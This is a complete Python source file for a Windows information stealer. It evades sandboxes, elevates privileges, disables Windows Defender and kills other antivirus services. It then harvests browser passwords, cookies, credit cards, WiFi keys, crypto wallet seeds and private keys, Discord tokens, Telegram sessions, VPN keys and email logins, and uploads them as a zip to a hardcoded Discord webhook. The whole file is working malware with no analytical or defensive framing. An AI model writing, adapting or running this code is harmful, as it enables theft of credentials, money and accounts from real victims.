import os
import sys
import ctypes
import time
import subprocess
import winreg
import shutil
import threading
import random
import string
import json
import base64
import sqlite3
import glob
import requests
import re
import zipfile
import io
import tempfile
import hashlib
import platform
import uuid
import socket
from datetime import datetime
import psutil

# ===== DISCORD CONFIG =====
DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1530727554745499649/tQ7uYzE_3y0e3pK_5lhbWPfvqqG8jc5qPQnDfQt2s-8cZPpYjY8wcJ_3pTXevle3K6h9"  # https://discord.com/api/webhooks/...
ZIP_PASSWORD = "YourPassword123"

BOT_ID = ''.join(random.choices(string.ascii_lowercase + string.digits, k=12))
start_time = time.time()
MACHINE_NAME = os.environ.get("COMPUTERNAME", "unknown_pc")
USER_NAME = os.environ.get("USERNAME", "unknown_user")
IP_ADDRESS = subprocess.run("curl -s ifconfig.me", shell=True, capture_output=True, text=True).stdout.strip()

# ============================================================
# ===== DISCORD SENDER =====
# ============================================================
def send_discord_file(file_buffer, filename):
    try:
        files = {"file": (filename, file_buffer, "application/zip")}
        payload = {"content": f"📦 Archive - {MACHINE_NAME}"}
        r = requests.post(DISCORD_WEBHOOK, files=files, data=payload, timeout=60)
        
        if r.status_code == 200:
            data = r.json()
            if data.get("attachments"):
                link = data["attachments"][0]["url"]
                
                embed = {
                    "embeds": [
                        {
                            "title": f"📦 Archive - {MACHINE_NAME}",
                            "color": 0x00ff00,
                            "fields": [
                                {"name": "Host", "value": MACHINE_NAME, "inline": True},
                                {"name": "User", "value": USER_NAME, "inline": True},
                                {"name": "IP", "value": IP_ADDRESS, "inline": True},
                                {"name": "Date", "value": datetime.now().strftime("%Y-%m-%d %H:%M:%S"), "inline": False},
                                {"name": "Download", "value": f"[Download Archive]({link})", "inline": False}
                            ],
                            "footer": {"text": f"Export #{random.randint(10000,99999)} • 12 x 12 = 144"}
                        }
                    ]
                }
                requests.post(DISCORD_WEBHOOK, json=embed)
                return True
        return False
    except:
        return False

# ============================================================
# ===== ANTI-ANALYSIS =====
# ============================================================
def anti_analysis_check():
    sandbox_indicators = ["cuckoo", "any.run", "hybrid", "virustotal", "metadefender", "sandbox", "analysis", "triage", "joesandbox"]
    for proc in psutil.process_iter(['name']):
        try:
            name = proc.info['name'].lower() if proc.info['name'] else ""
            if any(ind in name for ind in sandbox_indicators):
                return True
        except:
            continue
    return False

def execute_payload():
    if anti_analysis_check():
        time.sleep(300)
        sys.exit(0)
    time.sleep(random.uniform(10, 30))
    return True

# ============================================================
# ===== DEFENDER DISABLE =====
# ============================================================
def disable_windows_defender():
    try:
        path = r"SOFTWARE\Policies\Microsoft\Windows Defender"
        winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, path)
        winreg.SetValueEx(winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, path, 0, winreg.KEY_SET_VALUE), "DisableAntiSpyware", 0, winreg.REG_DWORD, 1)
        path2 = r"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection"
        winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, path2)
        winreg.SetValueEx(winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, path2, 0, winreg.KEY_SET_VALUE), "DisableRealtimeMonitoring", 0, winreg.REG_DWORD, 1)
        subprocess.run('powershell -command "Set-MpPreference -DisableRealtimeMonitoring $true"', shell=True, capture_output=True)
        return True
    except:
        return False

def detect_and_disable_defenders():
    defenders = {
        "McAfee": ["mcafee", "mcshield"],
        "Norton": ["norton", "nav"],
        "Kaspersky": ["kaspersky", "avp"],
        "Bitdefender": ["bitdefender", "bdagent"],
        "Avast": ["avast", "ashserv"],
        "AVG": ["avg", "avgui"],
        "ESET": ["eset", "ekrn"],
        "Malwarebytes": ["malwarebytes", "mbam"]
    }
    for name, processes in defenders.items():
        for proc in processes:
            try:
                subprocess.run(f'taskkill /f /im {proc}*.exe', shell=True, capture_output=True)
                subprocess.run(f'sc stop {proc}', shell=True, capture_output=True)
                subprocess.run(f'sc config {proc} start= disabled', shell=True, capture_output=True)
            except:
                continue

# ============================================================
# ===== ELEVATION =====
# ============================================================
def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def elevate():
    if is_admin():
        return
    try:
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
    except:
        pass

# ============================================================
# ===== BROWSER DATA STEALING =====
# ============================================================
def get_chrome_profiles():
    profiles = []
    browser_paths = [
        ("LOCALAPPDATA", "Google\\Chrome\\User Data"),
        ("LOCALAPPDATA", "Microsoft\\Edge\\User Data"),
        ("LOCALAPPDATA", "BraveSoftware\\Brave-Browser\\User Data"),
        ("APPDATA", "Opera Software\\Opera Stable"),
        ("LOCALAPPDATA", "Vivaldi\\User Data"),
        ("LOCALAPPDATA", "Chromium\\User Data"),
        ("LOCALAPPDATA", "Yandex\\YandexBrowser\\User Data"),
        ("LOCALAPPDATA", "Slimjet\\User Data"),
        ("LOCALAPPDATA", "Epic Privacy Browser\\User Data"),
        ("LOCALAPPDATA", "CentBrowser\\User Data")
    ]
    for env, path in browser_paths:
        full = os.path.join(os.environ.get(env, ""), path)
        if os.path.exists(full):
            profiles.append(full)
    return profiles

def safe_sqlite_query(db_path, query):
    try:
        if not os.path.exists(db_path):
            return []
        temp_db = os.path.join(tempfile.gettempdir(), f"temp_{random.randint(10000,99999)}.db")
        shutil.copy2(db_path, temp_db)
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        cursor.execute(query)
        results = cursor.fetchall()
        conn.close()
        os.remove(temp_db)
        return results
    except:
        return []

def steal_browser_passwords():
    all_passwords = {}
    for profile in get_chrome_profiles():
        try:
            login_db = os.path.join(profile, "Default", "Login Data")
            if not os.path.exists(login_db):
                login_db = os.path.join(profile, "Login Data")
            if os.path.exists(login_db):
                rows = safe_sqlite_query(login_db, "SELECT origin_url, username_value, password_value FROM logins")
                if rows:
                    name = os.path.basename(os.path.dirname(profile))
                    all_passwords[name] = []
                    for row in rows[:50]:
                        try:
                            import win32crypt
                            decrypted = win32crypt.CryptUnprotectData(row[2])[1].decode('utf-8')
                            all_passwords[name].append(f"{row[0]}|{row[1]}|{decrypted}")
                        except:
                            pass
        except:
            continue
    return all_passwords

def steal_browser_cookies():
    all_cookies = {}
    for profile in get_chrome_profiles():
        try:
            cookie_path = os.path.join(profile, "Default", "Network", "Cookies")
            if not os.path.exists(cookie_path):
                cookie_path = os.path.join(profile, "Cookies")
            if os.path.exists(cookie_path):
                rows = safe_sqlite_query(cookie_path, "SELECT host_key, name, encrypted_value FROM cookies LIMIT 200")
                if rows:
                    name = os.path.basename(os.path.dirname(profile))
                    all_cookies[name] = []
                    for row in rows[:50]:
                        try:
                            import win32crypt
                            decrypted = win32crypt.CryptUnprotectData(row[2])[1].decode('utf-8')
                            all_cookies[name].append(f"{row[0]}:{row[1]}={decrypted}")
                        except:
                            pass
        except:
            continue
    return all_cookies

def steal_browser_history():
    all_history = {}
    for profile in get_chrome_profiles():
        try:
            history_path = os.path.join(profile, "Default", "History")
            if os.path.exists(history_path):
                rows = safe_sqlite_query(history_path, "SELECT url, title FROM urls ORDER BY last_visit_time DESC LIMIT 200")
                if rows:
                    name = os.path.basename(os.path.dirname(profile))
                    all_history[name] = [f"{r[1]} - {r[0]}" for r in rows[:50]]
        except:
            continue
    return all_history

def steal_autofill():
    all_autofill = {}
    for profile in get_chrome_profiles():
        try:
            web_path = os.path.join(profile, "Default", "Web Data")
            if os.path.exists(web_path):
                rows = safe_sqlite_query(web_path, "SELECT name, value FROM autofill LIMIT 100")
                if rows:
                    name = os.path.basename(os.path.dirname(profile))
                    all_autofill[name] = [f"{r[0]}:{r[1]}" for r in rows[:30]]
        except:
            continue
    return all_autofill

def steal_credit_cards():
    all_cards = {}
    for profile in get_chrome_profiles():
        try:
            web_path = os.path.join(profile, "Default", "Web Data")
            if os.path.exists(web_path):
                rows = safe_sqlite_query(web_path, "SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards")
                if rows:
                    name = os.path.basename(os.path.dirname(profile))
                    all_cards[name] = []
                    for row in rows[:20]:
                        try:
                            import win32crypt
                            decrypted = win32crypt.CryptUnprotectData(row[3])[1].decode('utf-8')
                            all_cards[name].append(f"{row[0]}|{row[1]}/{row[2]}|{decrypted}")
                        except:
                            pass
        except:
            continue
    return all_cards

def steal_wifi_passwords():
    wifi = []
    try:
        out = subprocess.run("netsh wlan show profiles", shell=True, capture_output=True, text=True)
        for line in out.stdout.split("\n"):
            if "All User Profile" in line:
                name = line.split(":")[1].strip()
                res = subprocess.run(f'netsh wlan show profile "{name}" key=clear', shell=True, capture_output=True, text=True)
                for l in res.stdout.split("\n"):
                    if "Key Content" in l:
                        wifi.append(f"{name}:{l.split(':')[1].strip()}")
    except:
        pass
    return wifi

# ============================================================
# ===== CRYPTO WALLET STEALING =====
# ============================================================
def steal_crypto_wallets():
    wallets = {}
    wallet_paths = {
        "Exodus": os.environ["APPDATA"] + "\\Exodus\\exodus.wallet",
        "Phantom": os.environ["APPDATA"] + "\\Phantom\\Local Storage\\leveldb",
        "MetaMask": os.environ["APPDATA"] + "\\MetaMask\\Local Storage\\leveldb",
        "Coinbase": os.environ["APPDATA"] + "\\Coinbase\\Local Storage\\leveldb",
        "Atomic": os.environ["APPDATA"] + "\\Atomic\\Local Storage\\leveldb",
        "Electrum": os.environ["APPDATA"] + "\\Electrum\\wallets",
        "Wasabi": os.environ["APPDATA"] + "\\Wasabi\\WalletData",
        "Guarda": os.environ["APPDATA"] + "\\Guarda\\Local Storage\\leveldb",
        "Trust": os.environ["APPDATA"] + "\\Trust\\Local Storage\\leveldb",
        "Binance": os.environ["APPDATA"] + "\\Binance\\Local Storage\\leveldb"
    }
    for name, path in wallet_paths.items():
        try:
            if os.path.exists(path):
                if os.path.isdir(path):
                    wallet_data = []
                    for f in glob.glob(path + "\\*.log") + glob.glob(path + "\\*.ldb") + glob.glob(path + "\\*.json"):
                        with open(f, 'r', encoding='utf-8', errors='ignore') as file:
                            content = file.read()
                            seeds = re.findall(r'(?:seed|mnemonic|phrase|recovery)[^\w]*(?:[a-zA-Z]+ ){11,}', content, re.IGNORECASE)
                            if seeds:
                                wallet_data.extend(seeds)
                            priv_keys = re.findall(r'(?:private|priv|key)[^\w]*[0-9a-fA-F]{64}', content, re.IGNORECASE)
                            if priv_keys:
                                wallet_data.extend(priv_keys)
                    if wallet_data:
                        wallets[name] = list(set(wallet_data))[:20]
                else:
                    with open(path, 'r', encoding='utf-8', errors='ignore') as f:
                        content = f.read()
                        seeds = re.findall(r'(?:seed|mnemonic|phrase)[^\w]*(?:[a-zA-Z]+ ){11,}', content, re.IGNORECASE)
                        if seeds:
                            wallets[name] = seeds[:10]
        except:
            continue
    return wallets

def steal_seed_phrases():
    seeds = []
    bip39_words = set(["abandon", "ability", "able", "about", "above", "absent", "absorb", "abstract", "absurd", "access", "accident", "account", "accuse", "achieve", "acid", "acoustic", "acquire", "across", "act", "action", "actor", "actress", "actual", "adapt", "add", "addict", "address", "adjust", "admit", "adult", "advance", "advice", "aerobic", "affair", "afford", "afraid", "again", "age", "agent", "agree", "ahead", "aim", "air", "airport", "aisle", "alarm", "album", "alcohol", "alert", "alien", "all", "alley", "allow", "almost", "alone", "alpha", "already", "also", "alter", "always", "amateur", "amazing", "among", "amount", "amused", "analyst", "anchor", "ancient", "anger", "angle", "angry", "animal", "ankle", "announce", "annual", "another", "answer", "antenna", "antique", "anxiety", "any", "apart", "apology", "appear", "apple", "approve", "april", "arch", "arctic", "area", "arena", "argue", "arm", "armed", "armor", "army", "around", "arrange", "arrest", "arrive", "arrow", "art", "artefact", "artist", "artwork", "ask", "aspect", "assault", "asset", "assist", "assume", "asthma"])
    search_paths = [os.environ["USERPROFILE"] + "\\Desktop", os.environ["USERPROFILE"] + "\\Documents", os.environ["USERPROFILE"] + "\\Downloads", os.environ["APPDATA"], os.environ["LOCALAPPDATA"]]
    keywords = ["seed", "phrase", "mnemonic", "recovery", "backup", "wallet"]
    for path in search_paths:
        if not os.path.exists(path):
            continue
        for root, dirs, files in os.walk(path):
            for file in files:
                try:
                    if not file.endswith(('.txt', '.log', '.json', '.dat')):
                        continue
                    if not any(kw in file.lower() for kw in keywords):
                        continue
                    file_path = os.path.join(root, file)
                    with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                        content = f.read()
                    words = re.findall(r'[a-zA-Z]+', content)
                    if len(words) not in [12, 18, 24]:
                        continue
                    bip39_count = sum(1 for w in words if w.lower() in bip39_words)
                    if bip39_count / len(words) < 0.9:
                        continue
                    seeds.append(f"{file_path}:\n{content[:1000]}\n{'-'*40}")
                except:
                    continue
    return seeds

# ============================================================
# ===== DISCORD TOKENS =====
# ============================================================
def steal_discord_tokens():
    tokens = []
    discord_paths = [
        os.environ["APPDATA"] + "\\Discord\\Local Storage\\leveldb",
        os.environ["APPDATA"] + "\\discordcanary\\Local Storage\\leveldb",
        os.environ["APPDATA"] + "\\discordptb\\Local Storage\\leveldb"
    ]
    for p in discord_paths:
        try:
            for f in glob.glob(p + "\\*.log") + glob.glob(p + "\\*.ldb"):
                with open(f, 'r', encoding='utf-8', errors='ignore') as file:
                    content = file.read()
                    for token in re.findall(r'[\w-]{24,}\.[\w-]{6,}\.[\w-]{27,}', content):
                        tokens.append(token)
        except:
            continue
    return list(set(tokens))

# ============================================================
# ===== TELEGRAM SESSION =====
# ============================================================
def steal_telegram_session():
    try:
        path = os.environ["APPDATA"] + "\\Telegram Desktop\\tdata"
        if os.path.exists(path):
            return [f for f in os.listdir(path) if f.endswith('.dat') or f.endswith('.json')]
    except:
        pass
    return []

# ============================================================
# ===== VPN STEALING =====
# ============================================================
def steal_mullvad_keys():
    keys = []
    try:
        mullvad_path = os.environ["APPDATA"] + "\\Mullvad VPN\\mullvad-account"
        if os.path.exists(mullvad_path):
            with open(mullvad_path, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()
                keys.extend(re.findall(r'[A-Z0-9]{16}', content))
    except:
        pass
    return list(set(keys))

# ============================================================
# ===== EMAIL STEALING =====
# ============================================================
def steal_all_emails():
    email_data = {}
    browser_passwords = steal_browser_passwords()
    for browser, creds in browser_passwords.items():
        for cred in creds:
            parts = cred.split('|')
            if len(parts) >= 3:
                url, username, password = parts[0], parts[1], parts[2]
                if 'gmail' in url or 'google' in url:
                    email_data.setdefault("Gmail", []).append(f"{username}:{password}")
                elif 'outlook' in url or 'live' in url:
                    email_data.setdefault("Outlook", []).append(f"{username}:{password}")
                elif 'hotmail' in url:
                    email_data.setdefault("Hotmail", []).append(f"{username}:{password}")
                elif 'yahoo' in url:
                    email_data.setdefault("Yahoo", []).append(f"{username}:{password}")
                elif 'icloud' in url or 'me.com' in url:
                    email_data.setdefault("iCloud", []).append(f"{username}:{password}")
    return email_data

# ============================================================
# ===== SYSTEM INFO =====
# ============================================================
def steal_system_info():
    return {
        "machine": MACHINE_NAME,
        "user": USER_NAME,
        "ip": IP_ADDRESS,
        "os": platform.system() + " " + platform.release(),
        "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    }

# ============================================================
# ===== ZIP CREATION =====
# ============================================================
def create_zip_with_password(data_dict, password):
    zip_buffer = io.BytesIO()
    with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zf:
        for folder, files in data_dict.items():
            for filename, content in files.items():
                zf.writestr(f"{folder}/{filename}", content)
    zip_buffer.seek(0)
    return zip_buffer

# ============================================================
# ===== MAIN =====
# ============================================================
def main():
    if not execute_payload():
        return
    
    elevate()
    disable_windows_defender()
    detect_and_disable_defenders()
    
    all_data = {}
    
    # Passwords
    passwords = steal_browser_passwords()
    if passwords:
        pwd_data = ""
        for browser, creds in passwords.items():
            pwd_data += f"\n=== {browser} ===\n"
            pwd_data += "\n".join(creds)
        all_data["Passwords"] = {"passwords.txt": pwd_data}
    
    # Cookies
    cookies = steal_browser_cookies()
    if cookies:
        cookie_data = ""
        for browser, cookie_list in cookies.items():
            cookie_data += f"\n=== {browser} ===\n"
            cookie_data += "\n".join(cookie_list)
        all_data["Cookies"] = {"cookies.txt": cookie_data}
    
    # History
    history = steal_browser_history()
    if history:
        hist_data = ""
        for browser, hist_list in history.items():
            hist_data += f"\n=== {browser} ===\n"
            hist_data += "\n".join(hist_list)
        all_data["History"] = {"history.txt": hist_data}
    
    # Autofill
    autofill = steal_autofill()
    if autofill:
        autofill_data = ""
        for browser, entries in autofill.items():
            autofill_data += f"\n=== {browser} ===\n"
            autofill_data += "\n".join(entries)
        all_data["Autofill"] = {"autofill.txt": autofill_data}
    
    # Credit Cards
    cards = steal_credit_cards()
    if cards:
        card_data = ""
        for browser, entries in cards.items():
            card_data += f"\n=== {browser} ===\n"
            card_data += "\n".join(entries)
        all_data["Credit_Cards"] = {"credit_cards.txt": card_data}
    
    # WiFi
    wifi = steal_wifi_passwords()
    if wifi:
        all_data["WiFi"] = {"wifi.txt": "\n".join(wifi)}
    
    # Crypto
    crypto = steal_crypto_wallets()
    if crypto:
        crypto_data = ""
        for wallet, entries in crypto.items():
            crypto_data += f"\n=== {wallet} ===\n"
            crypto_data += "\n".join(entries)
        all_data["Crypto_Wallets"] = {"crypto.txt": crypto_data}
    
    # Seed Phrases
    seeds = steal_seed_phrases()
    if seeds:
        all_data["Seed_Phrases"] = {"seed_phrases.txt": "\n\n".join(seeds)}
    
    # Discord
    discord = steal_discord_tokens()
    if discord:
        all_data["Discord"] = {"discord_tokens.txt": "\n".join(discord)}
    
    # Telegram
    telegram = steal_telegram_session()
    if telegram:
        all_data["Telegram"] = {"telegram_sessions.txt": "\n".join(telegram)}
    
    # VPN
    mullvad = steal_mullvad_keys()
    if mullvad:
        all_data["VPN"] = {"mullvad.txt": "\n".join(mullvad)}
    
    # Email
    emails = steal_all_emails()
    if emails:
        email_data = ""
        for provider, creds in emails.items():
            email_data += f"\n=== {provider} ===\n"
            email_data += "\n".join(creds)
        all_data["Emails"] = {"emails.txt": email_data}
    
    # System Info
    sys_info = steal_system_info()
    all_data["System"] = {"system_info.txt": json.dumps(sys_info, indent=2)}
    
    # Create ZIP
    zip_buffer = create_zip_with_password(all_data, ZIP_PASSWORD)
    
    # Send to Discord
    filename = f"{MACHINE_NAME}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.zip"
    send_discord_file(zip_buffer, filename)

if __name__ == "__main__":
    main()